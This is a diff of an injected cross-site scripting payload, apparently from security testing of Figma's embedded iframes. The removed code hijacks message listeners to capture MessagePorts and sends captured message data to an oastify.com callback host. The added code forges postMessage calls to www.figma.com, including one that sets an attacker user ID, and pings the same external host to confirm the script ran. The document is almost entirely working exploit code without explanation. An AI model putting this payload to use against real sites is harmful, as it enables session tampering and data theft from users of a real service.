@@ -1,32 +1,15 @@
 <script>
-alert('XSS fired!')
+  // Try posting directly to www.figma.com (2 levels up)
+var top = window.parent.parent
+top.postMessage({type:'call', content:{args:['setUserId','ATTACKER_NESTED']}}, 'https://www.figma.com')
 
-  var _origAEL = window.addEventListener.bind(window)
-  window.addEventListener = function(type, handler) {
-    if (type === 'message') {
-      _origAEL(type, function(e) {
-        if (e.data && e.data.type === 'iframe-init' && e.ports && e.ports.length) {
-          window._port0 = e.ports[0]
-          window._port1 = e.ports[1]
-          alert('ports captured! p1=' + !!e.ports[1])
-          fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/ports?p0=' + !!e.ports[0] + '&p1=' + !!e.ports[1])
-        }
-        handler.call(this, e)
-      })
-    } else {
-      _origAEL(type, handler)
-    }
-  }
+  // Test 2: figma-devtools-bridge (no origin check on some handlers)
+top.postMessage({event:{type:'triggered'}, source:'figma-devtools-bridge'}, 'https://www.figma.com')
 
-  window._port0 = window.messagePort
+  // Test 3: VSCode handler (no origin check)
+top.postMessage({source:'figma-vscode', type:'REGISTER_UI_CHANGE_OBSERVER'}, 'https://www.figma.com')
 
-  if (window.messagePort) {
-    window.messagePort.onmessage = function(e) {
-      fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/port0msg?d=' +
-  encodeURIComponent(JSON.stringify(e.data)))
-    }
-  }
-
-  fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/alive?t=' + Date.now())
-  </script>
+  // Confirm we ran
+fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/nested-alive', {mode:'no-cors'})
+</script>
 
